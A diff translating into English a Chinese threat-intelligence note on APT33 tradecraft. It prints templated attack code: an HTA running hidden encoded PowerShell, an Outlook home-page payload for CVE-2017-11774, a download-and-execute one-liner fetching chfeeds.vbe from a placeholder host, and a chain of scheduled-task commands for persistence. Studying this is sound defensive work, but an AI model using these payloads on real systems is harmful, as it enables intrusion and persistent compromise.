@@ -1,8 +1,8 @@
 # APT33
 
-## 特征
+## Features
 
-1. 发送钓鱼邮件时，会包含指向恶意HTA（HTML Application，HTML应用程序）文件的链接，该HTA文件会下载该组织的后门.
+1. When sending phishing email, it will contain a link to a malicious HTA file, which will download the back door of the organization.
 
 ```HTA
 # Please Wait. Loading ...
@@ -14,14 +14,14 @@
 '''
  <script>
 a=new ActiveXObject("WScript.Shell");
-a.run('%windir%\\System32\\cmd.exe /c powershell -window hidden -enc 编码后命令', 0);
-//调用PowerShell下载后门
+a.run('%windir%\\System32\\cmd.exe /c powershell -window hidden -enc [Command after coding]', 0);
+//Call PowerShell download backdoor
 </script>
 
 '''
 ```
 
-2. 通过设置Outlook主页使用安全绕过漏洞（CVE-2017-11774）来使目标下载恶意文件.
+2. Make the target download malicious files by setting the Outlook home page security bypass vulnerability (CVE-2017-11774).
 
 ```html
 <html>
@@ -34,9 +34,9 @@ a.run('%windir%\\System32\\cmd.exe /c powershell -window hidden -enc 编码后�
   Sub window_onload()
          Set Application = ViewCtll.OutlookApplication
          Set cmd = Application.CreateObject("Wscript.shell')
-         //创建Wscript.shell类型对象
-         cmd.Run "cmd /c powershell.exe-w l -noni -nop -en  base64加密命令", 0, True
-         //使用PowerShell下载后门
+         //Create Wscript.shell type object
+         cmd.Run "cmd /c powershell.exe-w l -noni -nop -en  [Base64 encryption command]", 0, True
+         //Use PowerShell to download backdoor
   End sub
 -->
 </script>
@@ -49,16 +49,16 @@ a.run('%windir%\\System32\\cmd.exe /c powershell -window hidden -enc 编码后�
 </html>
 ```
 
-3. 在钓鱼邮件里写入恶意Url地址，当受害者点击时会下载HTA文件，该文件会下载chfeeds.vbe来充当下载器.
+3. Write a malicious Url address in the phishing email. When the victim clicks it, the HTA file will be downloaded, and the file will download chfeeds.vbe to act as a downloader.
 
 ```HTA
-[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};IEX(New-Object Net.WebClient).DownloadString('https://IP地址:端口/chfeeds.vbe');
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};IEX(New-Object Net.WebClient).DownloadString('https://IP:port/chfeeds.vbe');
 ```
 
-4. 通过JavaScript命令来使用schtasks创建计划任务，该计划任务会每天定点执行chfeeds.vbe下载.
+4. Use the JavaScript command to create a scheduled task using schtasks. The scheduled task will execute chfeeds.vbe download at a fixed point every day.
 
 ```JavaScript
 a.	run('%windir%\\System32\\cmd.exe /c PowerShell -window hidden schtasks.exe /CREATE /SC DAILY /TN "1" /TR "C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds\\chfeeds.vbe" /ST 01:00 /f
-//创建一个计划任务名为1，每天1:00时间运行chfeeds.vbe的计划任务
+//Create a scheduled task named 1 and run chfeeds.vbe at 1:00 every day
 && schtasks.exe /CREATE /SC DAILY /TN "3" /TR "C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds\\chfeeds.vbe" /ST 03:00 /f && schtasks.exe /CREATE /SC DAILY /TN "5" /TR "C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds\\chfeeds.vbe" /ST 05:00 /f && schtasks.exe /CREATE /SC DAILY /TN "7" /TR "C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds\\chfeeds.vbe" /ST 07:00 /f && schtasks.exe /CREATE /SC DAILY /TN "9" /TR "C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds\\chfeeds.vbe" /ST 09:00 /f && schtasks.exe /CREATE /SC DAILY /TN "11" /TR "C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds\\chfeeds.vbe" /ST 11:00 /f && schtasks.exe /CREATE /SC DAILY /TN "13" /TR "C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds\\chfeeds.vbe" /ST 13:00 /f && schtasks.exe /CREATE /SC DAILY /TN "15" /TR "C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds\\chfeeds.vbe" /ST 15:00 /f && schtasks.exe /CREATE /SC DAILY /TN "17" /TR "C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds\\chfeeds.vbe" /ST 17:00 /f && schtasks.exe /CREATE /SC DAILY /TN "19" /TR "C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds\\chfeeds.vbe" /ST 19:00 /f && schtasks.exe /CREATE /SC DAILY /TN "21" /TR "C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds\\chfeeds.vbe" /ST 21:00 /f && schtasks.exe /CREATE /SC DAILY /TN "23" /TR "C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds\\chfeeds.vbe" /ST 23:00 /f ')
 ```
